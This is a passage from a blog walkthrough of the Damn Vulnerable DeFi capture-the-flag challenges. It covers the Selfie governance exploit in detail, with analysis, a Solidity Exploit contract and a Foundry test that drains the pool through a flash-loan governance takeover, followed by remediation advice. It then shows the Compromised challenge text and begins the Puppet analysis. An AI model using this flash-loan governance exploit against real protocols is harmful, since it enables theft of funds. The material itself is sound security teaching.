<code>queueAction</code> and <code>executeAction</code>.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">queueAction</span>(
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">address</span> <span style="color:#434f54">receiver</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">bytes</span> <span style="color:#434f54">calldata</span> <span style="color:#728e00">data</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">uint256</span> <span style="color:#434f54">weiAmount</span>
</span></span><span style="display:flex;"><span>) <span style="color:#728e00">external</span> <span style="color:#728e00">returns</span> (<span style="color:#00979d">uint256</span>) {
</span></span><span style="display:flex; background-color:#e5e5e5"><span>    <span style="color:#728e00">if</span> (<span style="color:#728e00">!</span><span style="color:#434f54">_hasEnoughVotes</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>)) <span style="color:#728e00">revert</span> <span style="color:#434f54">NotEnoughVotesToPropose</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">if</span> (<span style="color:#434f54">receiver</span> <span style="color:#728e00">==</span> <span style="color:#00979d">address</span>(<span style="color:#728e00">this</span>))
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">revert</span> <span style="color:#434f54">CannotQueueActionsThatAffectGovernance</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">// ...
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>}
</span></span></code></pre></div><p>The first function adds an action proposal to the queue, where
the &ldquo;action proposal&rdquo; is an arbitrary function call at
<code>receiver</code> address. It starts with 2 pre-conditions:</p>
<ol>
<li>To queue an action you should have more than a half of the
total supply of governance tokens (DVT&rsquo;s) in the last
snapshot. This is checked in the <code>_hasEnoughVotes</code> function
(see below).</li>
<li>The second pre-condition makes sure that the call target of
the proposal action is not equal to the governance address.
In other words, it forbids calling the governance contract
from actions.</li>
</ol>
 <!--listend-->
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">_hasEnoughVotes</span>(<span style="color:#00979d">address</span> <span style="color:#434f54">account</span>) <span style="color:#728e00">private</span> <span style="color:#728e00">view</span> <span style="color:#728e00">returns</span> (<span style="color:#00979d">bool</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">uint256</span> <span style="color:#728e00">balance</span> <span style="color:#728e00">=</span> <span style="color:#434f54">governanceToken</span>.<span style="color:#434f54">getBalanceAtLastSnapshot</span>(<span style="color:#434f54">account</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">uint256</span> <span style="color:#434f54">halfTotalSupply</span> <span style="color:#728e00">=</span> <span style="color:#434f54">governanceToken</span>
</span></span><span style="display:flex;"><span>        .<span style="color:#434f54">getTotalSupplyAtLastSnapshot</span>() <span style="color:#728e00">/</span> <span style="color:#8a7b52">2</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">return</span> <span style="color:#728e00">balance</span> <span style="color:#728e00">&gt;</span> <span style="color:#434f54">halfTotalSupply</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Let&rsquo;s look at the second external function:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">executeAction</span>(<span style="color:#00979d">uint256</span> <span style="color:#434f54">actionId</span>) <span style="color:#728e00">external</span> <span style="color:#728e00">payable</span> {
</span></span><span style="display:flex; background-color:#e5e5e5"><span>    <span style="color:#728e00">if</span> (<span style="color:#728e00">!</span><span style="color:#434f54">_canBeExecuted</span>(<span style="color:#434f54">actionId</span>)) <span style="color:#728e00">revert</span> <span style="color:#434f54">CannotExecuteThisAction</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">GovernanceAction</span> <span style="color:#728e00">storage</span> <span style="color:#434f54">actionToExecute</span> <span style="color:#728e00">=</span> <span style="color:#434f54">actions</span>[<span style="color:#434f54">actionId</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">actionToExecute</span>.<span style="color:#434f54">executedAt</span> <span style="color:#728e00">=</span> <span style="color:#728e00">block</span>.<span style="color:#728e00">timestamp</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">actionToExecute</span>.<span style="color:#434f54">receiver</span>.<span style="color:#434f54">functionCallWithValue</span>(
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">actionToExecute</span>.<span style="color:#728e00">data</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">actionToExecute</span>.<span style="color:#434f54">weiAmount</span>
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">emit</span> <span style="color:#434f54">ActionExecuted</span>(<span style="color:#434f54">actionId</span>, <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>It checks that 2 days have passed since an action was queued by
calling the <code>_canBeExecuted</code> function:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">_canBeExecuted</span>(<span style="color:#00979d">uint256</span> <span style="color:#434f54">actionId</span>) <span style="color:#728e00">private</span> <span style="color:#728e00">view</span> <span style="color:#728e00">returns</span> (<span style="color:#00979d">bool</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">GovernanceAction</span> <span style="color:#728e00">memory</span> <span style="color:#434f54">actionToExecute</span> <span style="color:#728e00">=</span> <span style="color:#434f54">actions</span>[<span style="color:#434f54">actionId</span>];
</span></span><span style="display:flex; background-color:#e5e5e5"><span>    <span style="color:#728e00">return</span> (<span style="color:#434f54">actionToExecute</span>.<span style="color:#434f54">executedAt</span> <span style="color:#728e00">==</span> <span style="color:#8a7b52">0</span> <span style="color:#728e00">&amp;&amp;</span>
</span></span><span style="display:flex; background-color:#e5e5e5"><span>        (<span style="color:#728e00">block</span>.<span style="color:#728e00">timestamp</span> <span style="color:#728e00">-</span> <span style="color:#434f54">actionToExecute</span>.<span style="color:#434f54">proposedAt</span> <span style="color:#728e00">&gt;=</span>
</span></span><span style="display:flex; background-color:#e5e5e5"><span>            <span style="color:#434f54">ACTION_DELAY_IN_SECONDS</span>));
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div></li>
</ul>
 <!--list-separator-->
<ul>
<li>
<p>DamnValuableTokenSnapshot</p>
<p>It inherits from
<a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/extensions/ERC20Snapshot.sol"  class="external-link" target="_blank" rel="noopener">ERC20Snapshot</a>
and has 3 new external functions:</p>
<ul>
<li><code>snapshot</code> &ndash; Creates a new snapshot and returns its ID.</li>
<li><code>getBalanceAtLastSnapshot</code> &ndash; Returns balance of the given address at the time of the last snapshot.</li>
<li><code>getTotalSupplyAtLastSnapshot</code> &ndash; Returns the total supply at the last snapshot time.</li>
</ul>
<p>We have seen a similar contract in a
<a href="https://vyorkin.org/posts/ctf-walkthrough-damn-vulnerable-defi-5-the-rewarder" >previous
challenge</a>.</p>
</li>
</ul>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Exploit</p>
<p>The question is: how can we submit a proposal action that would
drain the pool? To do that we need to have a majority of DVT
(governance) tokens. And how do we get them? By taking a flash
loan!</p>
<p>So our exploit scenario might look like this:</p>
<ol>
<li>Create a separate <code>Exploit</code> contract with 2 functions: <code>run</code>
and <code>receiveTokens</code>.</li>
<li>In its <code>run</code> function, take a flash loan and borrow all the
governance tokens from the <code>SelfiePool</code>.</li>
<li>Approve spending of DVT tokens for the attacker, who is the
owner of our <code>Exploit</code> contract.</li>
<li>Record a new snapshot.</li>
<li>Now that we obviously have more than 50% of governance tokens
(we have all of them), we can call the <code>queueAction</code> to queue
the <code>drainAllFunds</code> proposal action.</li>
<li>Repay the flash loan.</li>
<li>Use the
<a href="https://book.getfoundry.sh/cheatcodes/warp?highlight=vm.warp#examples"  class="external-link" target="_blank" rel="noopener">vm.warp</a>
to travel in time 2 days ahead.</li>
<li>Execute the proposed action, which will call the <code>drainAllFunds</code> on behalf of the governance contract.</li>
<li>Transfer the all the funds from the <code>Exploit</code> contract to the
<code>attacker</code>&rsquo;s address.</li>
</ol>
<p>Let&rsquo;s go ahead and implement the <code>Exploit</code> contract:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">Exploit</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">SimpleGovernance</span> <span style="color:#728e00">private</span> <span style="color:#434f54">gov</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">SelfiePool</span> <span style="color:#728e00">private</span> <span style="color:#434f54">pool</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">DamnValuableTokenSnapshot</span> <span style="color:#728e00">private</span> <span style="color:#434f54">dvts</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">address</span> <span style="color:#728e00">private</span> <span style="color:#434f54">owner</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">uint256</span> <span style="color:#728e00">public</span> <span style="color:#434f54">actionId</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">constructor</span>(<span style="color:#434f54">SelfiePool</span> <span style="color:#434f54">_pool</span>, <span style="color:#434f54">DamnValuableTokenSnapshot</span> <span style="color:#434f54">_dvts</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">owner</span> <span style="color:#728e00">=</span> <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">pool</span> <span style="color:#728e00">=</span> <span style="color:#434f54">_pool</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">dvts</span> <span style="color:#728e00">=</span> <span style="color:#434f54">_dvts</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">gov</span> <span style="color:#728e00">=</span> <span style="color:#434f54">_pool</span>.<span style="color:#434f54">governance</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">run</span>() <span style="color:#728e00">external</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#00979d">uint256</span> <span style="color:#434f54">poolBalance</span> <span style="color:#728e00">=</span> <span style="color:#434f54">dvts</span>.<span style="color:#434f54">balanceOf</span>(<span style="color:#00979d">address</span>(<span style="color:#434f54">pool</span>));
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">pool</span>.<span style="color:#434f54">flashLoan</span>(<span style="color:#434f54">poolBalance</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">dvts</span>.<span style="color:#434f54">approve</span>(<span style="color:#434f54">owner</span>, <span style="color:#434f54">poolBalance</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">receiveTokens</span>(<span style="color:#00979d">address</span> <span style="color:#434f54">_dvts</span>, <span style="color:#00979d">uint256</span> <span style="color:#434f54">_amount</span>) <span style="color:#728e00">external</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">dvts</span>.<span style="color:#434f54">snapshot</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#00979d">bytes</span> <span style="color:#728e00">memory</span> <span style="color:#434f54">payload</span> <span style="color:#728e00">=</span> <span style="color:#728e00">abi</span>.<span style="color:#728e00">encodeWithSignature</span>(
</span></span><span style="display:flex;"><span>            <span style="color:#7f8c8d">&#34;drainAllFunds(address)&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#00979d">address</span>(<span style="color:#728e00">this</span>)
</span></span><span style="display:flex;"><span>        );
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">actionId</span> <span style="color:#728e00">=</span> <span style="color:#434f54">gov</span>.<span style="color:#434f54">queueAction</span>(<span style="color:#00979d">address</span>(<span style="color:#434f54">pool</span>), <span style="color:#434f54">payload</span>, <span style="color:#8a7b52">0</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">DamnValuableTokenSnapshot</span>(<span style="color:#434f54">_dvts</span>).<span style="color:#728e00">transfer</span>(<span style="color:#00979d">address</span>(<span style="color:#434f54">pool</span>), <span style="color:#434f54">_amount</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Here is the high-level exploit code:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">testExploit</span>() <span style="color:#728e00">public</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">/** EXPLOIT START **/</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">startPrank</span>(<span style="color:#434f54">attacker</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">Exploit</span> <span style="color:#434f54">expl</span> <span style="color:#728e00">=</span> <span style="color:#728e00">new</span> <span style="color:#434f54">Exploit</span>(<span style="color:#434f54">selfiePool</span>, <span style="color:#434f54">dvtSnapshot</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">expl</span>.<span style="color:#434f54">run</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">warp</span>(<span style="color:#728e00">block</span>.<span style="color:#728e00">timestamp</span> <span style="color:#728e00">+</span> <span style="color:#8a7b52">2</span> <span style="color:#00979d">days</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">simpleGovernance</span>.<span style="color:#434f54">executeAction</span>(<span style="color:#434f54">expl</span>.<span style="color:#434f54">actionId</span>());
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">uint256</span> <span style="color:#434f54">totalAmount</span> <span style="color:#728e00">=</span> <span style="color:#434f54">dvtSnapshot</span>.<span style="color:#434f54">balanceOf</span>(<span style="color:#00979d">address</span>(<span style="color:#434f54">expl</span>));
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">dvtSnapshot</span>.<span style="color:#434f54">transferFrom</span>(<span style="color:#00979d">address</span>(<span style="color:#434f54">expl</span>), <span style="color:#434f54">attacker</span>, <span style="color:#434f54">totalAmount</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">stopPrank</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">/** EXPLOIT END **/</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">validation</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>And we&rsquo;re done! We have drained the pool and stolen all DVT&rsquo;s
from it.</p>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Summary &amp; Notes</p>
<p>Flash loans could be used to abuse the gornance systems that
rely on the majority of the token holders.</p>
<p>This kind of manipulation attack happened in a real life recently:</p>
 <div class="quote2">
<p>Credit-based stablecoin protocol Beanstalk Farms lost all of its $182 million collateral from a security breach caused by two sinister governance proposals and a flash loan attack.</p>
 </div>
<p>It isn&rsquo;t new and Beanstalk is unlikely to be the last victim.</p>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Remediation</p>
<ol>
<li>
<p>Require different blocks for depositing governance tokens and
submitting a proposal action. Flash loans cannot execute
outside of a single block.</p>
</li>
<li>
<p>Use well tested implementations like <a href="https://docs.openzeppelin.com/contracts/4.x/api/governance"  class="external-link" target="_blank" rel="noopener">primitives for on-chain governance</a> by OpenZeppelin.</p>
</li>
</ol>
<p><a href="https://docs.uniswap.org/protocol/concepts/governance/adversarial-circumstances"  class="external-link" target="_blank" rel="noopener">Adversarial Circumstances</a> &ndash; exploration of some adversarial
scenarios and circumventions on the example of Uniswap governance.</p>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>References</p>
<ul>
<li><a href="https://cointelegraph.com/news/beanstalk-farms-loses-182m-in-defi-governance-exploit"  class="external-link" target="_blank" rel="noopener">Beanstalk Farms loses $182M in DeFi governance exploit</a></li>
<li><a href="https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#ERC20Snapshot"  class="external-link" target="_blank" rel="noopener">ERC20Snapshot</a> &ndash; OpenZeppelin docs.</li>
<li><a href="https://youtu.be/GbDAmMdmh8Q"  class="external-link" target="_blank" rel="noopener">Strategies for Secure
Governance with Smart Contracts</a> &ndash; Covers battle-tested practices and recommended patterns to build safe and robust on-chain governance smart contracts in Ethereum.</li>
</ul>
<hr>
<p>Thank you for reading! You can find the full code
<a href="https://github.com/vyorkin/damn-vulnerable-defi-solutions/blob/master/src/test/Levels/selfie/Selfie.t.sol"  class="external-link" target="_blank" rel="noopener">here</a>.</p>
<p>Let&rsquo;s continue to the next challenge &ndash;
<a href="https://vyorkin.org/posts/ctf-walkthrough-damn-vulnerable-defi-5-the-rewarder" >#7
Compromised</a>!</p>
</li>
</ul>
</li>
</ul>
<!--list-separator-->
<ul>
<li>
<p><span class="org-todo done DONE">DONE</span>  Damn Vulnerable DeFi, #7 Compromised</p>
  <!--list-separator-->
<ul>
<li>
<p>Challenge</p>
 <div class="quote2">
<p>While poking around a web service of one of the most popular DeFi projects in the space, you get a somewhat strange response from their server. This is a snippet:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span><span style="color:#434f54">HTTP</span><span style="color:#728e00">/</span><span style="color:#8a7b52">2</span> <span style="color:#8a7b52">200</span> <span style="color:#434f54">OK</span>
</span></span><span style="display:flex;"><span><span style="color:#434f54">content</span><span style="color:#728e00">-</span><span style="color:#434f54">type</span>: <span style="color:#434f54">text</span><span style="color:#728e00">/</span><span style="color:#434f54">html</span>
</span></span><span style="display:flex;"><span><span style="color:#434f54">content</span><span style="color:#728e00">-</span><span style="color:#434f54">language</span>: <span style="color:#434f54">en</span>
</span></span><span style="display:flex;"><span><span style="color:#434f54">vary</span>: <span style="color:#434f54">Accept</span><span style="color:#728e00">-</span><span style="color:#434f54">Encoding</span>
</span></span><span style="display:flex;"><span><span style="color:#434f54">server</span>: <span style="color:#434f54">cloudflare</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8a7b52">4</span><span style="color:#434f54">d</span> <span style="color:#8a7b52">48</span> <span style="color:#8a7b52">68</span> <span style="color:#8a7b52">6</span><span style="color:#434f54">a</span> <span style="color:#8a7b52">4</span><span style="color:#434f54">e</span> <span style="color:#8a7b52">6</span><span style="color:#434f54">a</span> <span style="color:#8a7b52">63</span> <span style="color:#8a7b52">34</span> <span style="color:#8a7b52">5</span><span style="color:#434f54">a</span> <span style="color:#8a7b52">57</span> <span style="color:#8a7b52">59</span> <span style="color:#8a7b52">78</span> <span style="color:#8a7b52">59</span> <span style="color:#8a7b52">57</span> <span style="color:#8a7b52">45</span> <span style="color:#8a7b52">30</span> <span style="color:#8a7b52">4</span><span style="color:#434f54">e</span> <span style="color:#8a7b52">54</span>
</span></span><span style="display:flex;"><span><span style="color:#8a7b52">5</span><span style="color:#434f54">a</span> <span style="color:#8a7b52">6</span><span style="color:#434f54">b</span> <span style="color:#8a7b52">59</span> <span style="color:#8a7b52">54</span> <span style="color:#8a7b52">59</span> <span style="color:#8a7b52">31</span> <span style="color:#8a7b52">59</span> <span style="color:#8a7b52">7</span><span style="color:#434f54">a</span> <span style="color:#8a7b52">5</span><span style="color:#434f54">a</span> <span style="color:#8a7b52">6</span><span style="color:#434f54">d</span> <span style="color:#8a7b52">59</span> <span style="color:#8a7b52">7</span><span style="color:#434f54">a</span> <span style="color:#8a7b52">55</span> <span style="color:#8a7b52">34</span> <span style="color:#8a7b52">4</span><span style="color:#434f54">e</span> <span style="color:#8a7b52">6</span><span style="color:#434f54">a</span> <span style="color:#8a7b52">46</span> <span style="color:#8a7b52">6</span><span style="color:#434f54">b</span>
</span></span><span style="display:flex;"><span><span style="color:#8a7b52">4</span><span style="color:#434f54">e</span> <span style="color:#8a7b52">44</span> <span style="color:#8a7b52">51</span> <span style="color:#8a7b52">34</span> <span style="color:#8a7b52">4</span><span style="color:#434f54">f</span> <span style="color:#8a7b52">54</span> <span style="color:#8a7b52">4</span><span style="color:#434f54">a</span> <span style="color:#8a7b52">6</span><span style="color:#434f54">a</span> <span style="color:#8a7b52">5</span><span style="color:#434f54">a</span> <span style="color:#8a7b52">47</span> <span style="color:#8a7b52">5</span><span style="color:#434f54">a</span> <span style="color:#8a7b52">68</span> <span style="color:#8a7b52">59</span> <span style="color:#8a7b52">7</span><span style="color:#434f54">a</span> <span style="color:#8a7b52">42</span> <span style="color:#8a7b52">6</span><span style="color:#434f54">a</span> <span style="color:#8a7b52">4</span><span style="color:#434f54">e</span> <span style="color:#8a7b52">6</span><span style="color:#434f54">d</span>
</span></span><span style="display:flex;"><span><span style="color:#8a7b52">4</span><span style="color:#434f54">d</span> <span style="color:#8a7b52">34</span> <span style="color:#8a7b52">59</span> <span style="color:#8a7b52">7</span><span style="color:#434f54">a</span> <span style="color:#8a7b52">49</span> <span style="color:#8a7b52">31</span> <span style="color:#8a7b52">4</span><span style="color:#434f54">e</span> <span style="color:#8a7b52">6</span><span style="color:#434f54">a</span> <span style="color:#8a7b52">42</span> <span style="color:#8a7b52">69</span> <span style="color:#8a7b52">5</span><span style="color:#434f54">a</span> <span style="color:#8a7b52">6</span><span style="color:#434f54">a</span> <span style="color:#8a7b52">42</span> <span style="color:#8a7b52">6</span><span style="color:#434f54">a</span> <span style="color:#8a7b52">4</span><span style="color:#434f54">f</span> <span style="color:#8a7b52">57</span> <span style="color:#8a7b52">5</span><span style="color:#434f54">a</span> <span style="color:#8a7b52">69</span>
</span></span><span style="display:flex;"><span><span style="color:#8a7b52">59</span> <span style="color:#8a7b52">32</span> <span style="color:#8a7b52">52</span> <span style="color:#8a7b52">68</span> <span style="color:#8a7b52">5</span><span style="color:#434f54">a</span> <span style="color:#8a7b52">54</span> <span style="color:#8a7b52">4</span><span style="color:#434f54">a</span> <span style="color:#8a7b52">6</span><span style="color:#434f54">d</span> <span style="color:#8a7b52">4</span><span style="color:#434f54">e</span> <span style="color:#8a7b52">44</span> <span style="color:#8a7b52">63</span> <span style="color:#8a7b52">7</span><span style="color:#434f54">a</span> <span style="color:#8a7b52">4</span><span style="color:#434f54">e</span> <span style="color:#8a7b52">57</span> <span style="color:#8a7b52">45</span> <span style="color:#8a7b52">35</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8a7b52">4</span><span style="color:#434f54">d</span> <span style="color:#8a7b52">48</span> <span style="color:#8a7b52">67</span> <span style="color:#8a7b52">79</span> <span style="color:#8a7b52">4</span><span style="color:#434f54">d</span> <span style="color:#8a7b52">44</span> <span style="color:#8a7b52">67</span> <span style="color:#8a7b52">79</span> <span style="color:#8a7b52">4</span><span style="color:#434f54">e</span> <span style="color:#8a7b52">44</span> <span style="color:#8a7b52">4</span><span style="color:#434f54">a</span> <span style="color:#8a7b52">6</span><span style="color:#434f54">a</span> <span style="color:#8a7b52">4</span><span style="color:#434f54">e</span> <span style="color:#8a7b52">44</span> <span style="color:#8a7b52">42</span> <span style="color:#8a7b52">68</span> <span style="color:#8a7b52">59</span> <span style="color:#8a7b52">32</span>
</span></span><span style="display:flex;"><span><span style="color:#8a7b52">52</span> <span style="color:#8a7b52">6</span><span style="color:#434f54">d</span> <span style="color:#8a7b52">59</span> <span style="color:#8a7b52">54</span> <span style="color:#8a7b52">6</span><span style="color:#434f54">c</span> <span style="color:#8a7b52">6</span><span style="color:#434f54">c</span> <span style="color:#8a7b52">5</span><span style="color:#434f54">a</span> <span style="color:#8a7b52">44</span> <span style="color:#8a7b52">67</span> <span style="color:#8a7b52">34</span> <span style="color:#8a7b52">4</span><span style="color:#434f54">f</span> <span style="color:#8a7b52">57</span> <span style="color:#8a7b52">55</span> <span style="color:#8a7b52">32</span> <span style="color:#8a7b52">4</span><span style="color:#434f54">f</span> <span style="color:#8a7b52">44</span> <span style="color:#8a7b52">56</span> <span style="color:#8a7b52">6</span><span style="color:#434f54">a</span>
</span></span><span style="display:flex;"><span><span style="color:#8a7b52">4</span><span style="color:#434f54">d</span> <span style="color:#8a7b52">6</span><span style="color:#434f54">a</span> <span style="color:#8a7b52">4</span><span style="color:#434f54">d</span> <span style="color:#8a7b52">31</span> <span style="color:#8a7b52">4</span><span style="color:#434f54">e</span> <span style="color:#8a7b52">44</span> <span style="color:#8a7b52">64</span> <span style="color:#8a7b52">68</span> <span style="color:#8a7b52">59</span> <span style="color:#8a7b52">32</span> <span style="color:#8a7b52">4</span><span style="color:#434f54">a</span> <span style="color:#8a7b52">6</span><span style="color:#434f54">c</span> <span style="color:#8a7b52">5</span><span style="color:#434f54">a</span> <span style="color:#8a7b52">44</span> <span style="color:#8a7b52">6</span><span style="color:#434f54">c</span> <span style="color:#8a7b52">69</span> <span style="color:#8a7b52">5</span><span style="color:#434f54">a</span> <span style="color:#8a7b52">57</span>
</span></span><span style="display:flex;"><span><span style="color:#8a7b52">5</span><span style="color:#434f54">a</span> <span style="color:#8a7b52">6</span><span style="color:#434f54">a</span> <span style="color:#8a7b52">4</span><span style="color:#434f54">e</span> <span style="color:#8a7b52">6</span><span style="color:#434f54">a</span> <span style="color:#8a7b52">41</span> <span style="color:#8a7b52">7</span><span style="color:#434f54">a</span> <span style="color:#8a7b52">4</span><span style="color:#434f54">e</span> <span style="color:#8a7b52">7</span><span style="color:#434f54">a</span> <span style="color:#8a7b52">46</span> <span style="color:#8a7b52">6</span><span style="color:#434f54">c</span> <span style="color:#8a7b52">4</span><span style="color:#434f54">f</span> <span style="color:#8a7b52">54</span> <span style="color:#8a7b52">67</span> <span style="color:#8a7b52">33</span> <span style="color:#8a7b52">4</span><span style="color:#434f54">e</span> <span style="color:#8a7b52">57</span> <span style="color:#8a7b52">5</span><span style="color:#434f54">a</span> <span style="color:#8a7b52">69</span>
</span></span><span style="display:flex;"><span><span style="color:#8a7b52">59</span> <span style="color:#8a7b52">32</span> <span style="color:#8a7b52">51</span> <span style="color:#8a7b52">33</span> <span style="color:#8a7b52">4</span><span style="color:#434f54">d</span> <span style="color:#8a7b52">7</span><span style="color:#434f54">a</span> <span style="color:#8a7b52">59</span> <span style="color:#8a7b52">7</span><span style="color:#434f54">a</span> <span style="color:#8a7b52">4</span><span style="color:#434f54">e</span> <span style="color:#8a7b52">44</span> <span style="color:#8a7b52">42</span> <span style="color:#8a7b52">69</span> <span style="color:#8a7b52">59</span> <span style="color:#8a7b52">6</span><span style="color:#434f54">a</span> <span style="color:#8a7b52">51</span> <span style="color:#8a7b52">34</span>
</span></span></code></pre></div> </div>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>Analysis</li>
</ul>
  <!--list-separator-->
<ul>
<li>Solution</li>
</ul>
  <!--list-separator-->
<ul>
<li>Remediation</li>
</ul>
  <!--list-separator-->
<ul>
<li>Conclusion</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>References</p>
<p>I hope you enjoyed reading this post. The code for this
challenge is
<a href="https://github.com/vyorkin/damn-vulnerable-defi-solutions/blob/master/src/test/Levels/puppet/Puppet.t.sol"  class="external-link" target="_blank" rel="noopener">here</a>.
Let&rsquo;s continue to the next one &ndash;
<a href="https://vyorkin.org/posts/ctf-walkthrough-damn-vulnerable-defi-8-puppet" >#8
Puppet</a>.</p>
</li>
</ul>
</li>
</ul>
<!--list-separator-->
<ul>
<li>
<p><span class="org-todo done DONE">DONE</span>  Damn Vulnerable DeFi, #8 Puppet</p>
  <!--list-separator-->
<ul>
<li>
<p>Challenge</p>
 <div class="quote2">
<p>There&rsquo;s a huge lending pool borrowing Damn Valuable Tokens
(DVTs), where you first need to deposit twice the borrow amount
in ETH as collateral. The pool currently has 100000 DVTs in
liquidity.</p>
<p>There&rsquo;s a DVT market opened in an
<a href="https://docs.uniswap.org/protocol/V1/introduction"  class="external-link" target="_blank" rel="noopener">description
Uniswap v1 exchange</a>, currently with 10 ETH and 10 DVT in
liquidity.</p>
<p>Starting with 25 ETH and 1000 DVTs in balance, you must steal
all tokens from the lending pool.</p>
 </div>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Analysis</p>
<p>The <code>Puppet.t.sol</code> test contract uses the
<a href="https://book.getfoundry.sh/reference/forge-std/deployCode?highlight=deployCode#deploycode"  class="external-link" target="_blank" rel="noopener">deployCode</a>
to deploy Uniswap V1 contracts by fetching the ABI and bytecode
from the artifacts directory. We assume it is an original
Uniswap V1 pool so we can read
<a href="https://docs.uniswap.org/protocol/V1/introduction"  class="external-link" target="_blank" rel="noopener">the docs</a>
to see how to interact with it.</p>
<p>Let&rsquo;s review the <code>borrow</code> function:</p>
